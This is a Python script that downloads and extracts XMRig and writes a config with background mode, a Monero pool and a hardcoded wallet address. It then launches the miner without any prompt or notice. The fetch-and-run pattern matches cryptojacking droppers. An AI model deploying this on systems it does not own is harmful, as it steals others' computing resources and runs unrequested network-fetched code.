#!/usr/bin/env python3

import os
import subprocess
import urllib.request

def download_xmrig():
    url = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz"
    filename = "xmrig.tar.gz"
    urllib.request.urlretrieve(url, filename)
    return filename

def extract_xmrig(filename):
    subprocess.run(["tar", "-xzf", filename])
    os.remove(filename)

def create_config_file():
    config = '''
{
    "api": {
        "id": "6B185680-D7DA-11DD-AB5A-B06EBFCCF22E",
        "worker-id": "6B185680-D7DA-11DD-AB5A-B06EBFCCF22E"
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": true,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": 1,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31],
        "cn": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5],
            [1, 6],
            [1, 7],
            [1, 8],
            [1, 9],
            [1, 10],
            [1, 11],
            [1, 12],
            [1, 13],
            [1, 14],
            [1, 15],
            [1, 16],
            [1, 17],
            [1, 18],
            [1, 19],
            [1, 20],
            [1, 21],
            [1, 22],
            [1, 23],
            [1, 24],
            [1, 25],
            [1, 26],
            [1, 27],
            [1, 28],
            [1, 29],
            [1, 30],
            [1, 31]
        ],
        "cn-heavy": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6],
            [1, 8],
            [1, 10],
            [1, 12],
            [1, 14],
            [1, 16],
            [1, 18],
            [1, 20],
            [1, 22],
            [1, 24],
            [1, 26],
            [1, 28],
            [1, 30]
        ],
        "cn-lite": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5],
            [1, 6],
            [1, 7],
            [1, 8],
            [1, 9],
            [1, 10],
            [1, 11],
            [1, 12],
            [1, 13],
            [1, 14],
            [1, 15],
            [1, 16],
            [1, 17],
            [1, 18],
            [1, 19],
            [1, 20],
            [1, 21],
            [1, 22],
            [1, 23],
            [1, 24],
            [1, 25],
            [1, 26],
            [1, 27],
            [1, 28],
            [1, 29],
            [1, 30],
            [1, 31]
        ],
        "cn-pico": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7],
            [2, 8],
            [2, 9],
            [2, 10],
            [2, 11],
            [2, 12],
            [2, 13],
            [2, 14],
            [2, 15],
            [2, 16],
            [2, 17],
            [2, 18],
            [2, 19],
            [2, 20],
            [2, 21],
            [2, 22],
            [2, 23],
            [2, 24],
            [2, 25],
            [2, 26],
            [2, 27],
            [2, 28],
            [2, 29],
            [2, 30],
            [2, 31]
        ],
        "cn/upx2": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7],
            [2, 8],
            [2, 9],
            [2, 10],
            [2, 11],
            [2, 12],
            [2, 13],
            [2, 14],
            [2, 15],
            [2, 16],
            [2, 17],
            [2, 18],
            [2, 19],
            [2, 20],
            [2, 21],
            [2, 22],
            [2, 23],
            [2, 24],
            [2, 25],
            [2, 26],
            [2, 27],
            [2, 28],
            [2, 29],
            [2, 30],
            [2, 31]
        ],
        "ghostrider": [
            [8, 0],
            [8, 2],
            [8, 4],
            [8, 6],
            [8, 8],
            [8, 10],
            [8, 12],
            [8, 14],
            [8, 16],
            [8, 18],
            [8, 20],
            [8, 22],
            [8, 24],
            [8, 26],
            [8, 28],
            [8, 30]
        ],
        "rx": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31],
        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31],
        "cn-lite/0": false,
        "cn/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn": [
            {
                "index": 0,
                "threads": 28,
                "blocks": 384,
                "bfactor": 6,
                "bsleep": 25,
                "affinity": -1
            }
        ],
        "cn-heavy": [
            {
                "index": 0,
                "threads": 14,
                "blocks": 384,
                "bfactor": 6,
                "bsleep": 25,
                "affinity": -1
            }
        ],
        "cn-lite": [
            {
                "index": 0,
                "threads": 58,
                "blocks": 384,
                "bfactor": 6,
                "bsleep": 25,
                "affinity": -1
            }
        ],
        "cn-pico": [
            {
                "index": 0,
                "threads": 128,
                "blocks": 384,
                "bfactor": 6,
                "bsleep": 25,
                "affinity": -1
            }
        ],
        "cn/2": [
            {
                "index": 0,
                "threads": 28,
                "blocks": 384,
                "bfactor": 6,
                "bsleep": 25,
                "affinity": -1
            }
        ],
        "cn/upx2": [
            {
                "index": 0,
                "threads": 128,
                "blocks": 384,
                "bfactor": 6,
                "bsleep": 25,
                "affinity": -1
            }
        ],
        "cn-lite/0": false,
        "cn/0": false
    },
    "log-file": null,
    "donate-level": 1,
    "donate-over-proxy": 1,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "xmrpool.eu:9999",
            "user": "45i7kjWZuzJ4PdSbandaaE8S6mQATmneTYEpgsaaCqDmc7foEJDXwxd3ABR8bn6YE4c7hZ2dYEEr1CwG48gAknPL6zUpYyV+SD1",
            "pass": null,
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "sni": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
    '''
    with open("config.json", "w") as file:
        file.write(config)

def run_xmrig():
    os.chdir("xmrig-6.18.0")
    subprocess.run(["./xmrig", "--config=../config.json"])

def main():
    filename = download_xmrig()
    extract_xmrig(filename)
    create_config_file()
    run_xmrig()

main()
